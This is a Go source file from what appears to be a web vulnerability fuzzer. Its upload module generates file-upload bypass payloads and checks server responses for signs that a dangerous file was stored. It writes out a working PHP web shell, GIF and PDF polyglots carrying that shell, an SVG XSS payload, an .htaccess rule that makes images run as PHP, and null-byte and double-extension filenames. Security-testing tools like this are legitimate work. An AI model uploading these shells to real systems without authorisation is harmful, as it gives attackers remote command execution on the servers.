package vulns

import (
	"strings"

	"github.com/renansj/ryofuzz/internal/input"
	"github.com/renansj/ryofuzz/internal/mutator"
)

type UploadModule struct{}

func (m *UploadModule) Name() string        { return "upload" }
func (m *UploadModule) Description() string { return "File Upload Bypass" }

func (m *UploadModule) GeneratePayloads(points []input.InjectionPoint, mode string, mutations int) []mutator.Payload {
	var payloads []mutator.Payload

	uploadPayloads := []struct {
		value   string
		variant string
	}{
		{"shell.php", "ext-php"},
		{"shell.php5", "ext-php5"},
		{"shell.phtml", "ext-phtml"},
		{"shell.php.jpg", "double-ext"},
		{"shell.jpg.php", "double-ext-rev"},
		{"shell.php%00.png", "null-byte"},
		{"shell.php\x00.png", "null-byte-raw"},
		{"shell.PhP", "ext-case"},
		{"shell.php;.jpg", "semicolon-ext"},
		{"shell.php%0a.jpg", "newline-ext"},
		{".htaccess", "htaccess"},
		{"shell.aspx", "ext-aspx"},
		{"shell.jsp", "ext-jsp"},
		{"shell.svg", "ext-svg-xss"},
		{"....//shell.php", "traversal-ext"},
	}

	contentPayloads := []struct {
		value   string
		variant string
	}{
		{"<svg onload=alert(1)>", "svg-xss"},
		{"<?php system($_GET['c']); ?>", "php-webshell"},
		{"GIF89a<?php system($_GET['c']); ?>", "gif-polyglot"},
		{"%PDF-1.4\n<?php system($_GET['c']); ?>", "pdf-polyglot"},
	}

	for _, point := range points {
		name := strings.ToLower(point.Name)
		isFileField := strings.Contains(name, "file") || strings.Contains(name, "upload") ||
			strings.Contains(name, "attachment") || strings.Contains(name, "document") ||
			strings.Contains(name, "avatar") || strings.Contains(name, "image")

		// Real multipart/form-data uploads for file-like fields
		if isFileField {
			fileTests := []struct {
				filename string
				content  string
				ctype    string
				variant  string
			}{
				{"shell.php", "<?php system($_GET['c']); ?>", "application/x-php", "mp-php"},
				{"shell.php.jpg", "<?php system($_GET['c']); ?>", "image/jpeg", "mp-double-ext"},
				{"shell.jpg.php", "<?php system($_GET['c']); ?>", "image/jpeg", "mp-double-ext-rev"},
				{"shell.phtml", "<?php system($_GET['c']); ?>", "application/octet-stream", "mp-phtml"},
				{"shell.php%00.jpg", "<?php system($_GET['c']); ?>", "image/jpeg", "mp-nullbyte"},
				{"x.svg", "<svg onload=alert(1)>", "image/svg+xml", "mp-svg-xss"},
				{"gif.php", "GIF89a<?php system($_GET['c']); ?>", "image/gif", "mp-gif-polyglot"},
				{".htaccess", "AddType application/x-httpd-php .jpg", "text/plain", "mp-htaccess"},
			}
			for _, ft := range fileTests {
				payloads = append(payloads, mutator.Payload{
					Value:   ft.filename,
					Point:   point,
					Module:  "upload",
					Variant: ft.variant,
					Metadata: map[string]string{
						"upload":          "1",
						"upload_field":    point.Name,
						"upload_filename": ft.filename,
						"upload_content":  ft.content,
						"upload_ctype":    ft.ctype,
					},
				})
			}
		}

		// Legacy: filename-as-value (for params that take a filename string)
		if isFileField || strings.Contains(name, "name") {
			for _, p := range uploadPayloads {
				payloads = append(payloads, mutator.Payload{
					Value: p.value, Point: point, Module: "upload", Variant: p.variant,
				})
			}
		}
		if strings.Contains(name, "content") || strings.Contains(name, "data") ||
			strings.Contains(name, "body") {
			for _, p := range contentPayloads {
				payloads = append(payloads, mutator.Payload{
					Value: p.value, Point: point, Module: "upload", Variant: p.variant,
				})
			}
		}
	}
	return payloads
}

func (m *UploadModule) Detect(payload mutator.Payload, baseBody string, baseStatus int, baseTime int64,
	respBody string, respStatus int, respTime int64, respHeaders map[string][]string) *Finding {

	if respStatus != 200 && respStatus != 201 {
		return nil
	}

	// SVG XSS detection (covers both legacy and multipart svg variants)
	if payload.Variant == "svg-xss" || payload.Variant == "mp-svg-xss" {
		if strings.Contains(respBody, "<svg") && strings.Contains(respBody, "onload") {
			return &Finding{
				Module:      "upload",
				Severity:    "high",
				Confidence:  "confirmed",
				Title:       "SVG Upload XSS - Unsanitized SVG reflected",
				Description: "Uploaded SVG with event handler is reflected without sanitization",
				Payload:     payload.Value,
				Point:       payload.Point,
				Evidence:    "SVG onload handler present in response",
				OWASP:       "A04:2021",
				CWE:         "CWE-434",
			}
		}
	}

	// Check if file was stored (URL/path in response)
	storedIndicators := []string{"http://", "https://", "/uploads/", "/files/", "/media/", "/storage/", "\"url\"", "\"path\"", "\"location\""}
	for _, ind := range storedIndicators {
		if strings.Contains(respBody, ind) && !strings.Contains(baseBody, ind) {
			// Check if our filename appears
			fname := payload.Value
			if idx := strings.LastIndex(fname, "/"); idx >= 0 {
				fname = fname[idx+1:]
			}
			if strings.Contains(respBody, ".php") || strings.Contains(respBody, ".jsp") ||
				strings.Contains(respBody, ".aspx") || strings.Contains(respBody, fname) {
				return &Finding{
					Module:      "upload",
					Severity:    "critical",
					Confidence:  "high",
					Title:       "File Upload - Dangerous file stored",
					Description: "Server accepted and stored a file with a dangerous extension",
					Payload:     payload.Value,
					Point:       payload.Point,
					Evidence:    "File reference found in response: " + ind,
					OWASP:       "A04:2021",
					CWE:         "CWE-434",
				}
			}
		}
	}

	return nil
}
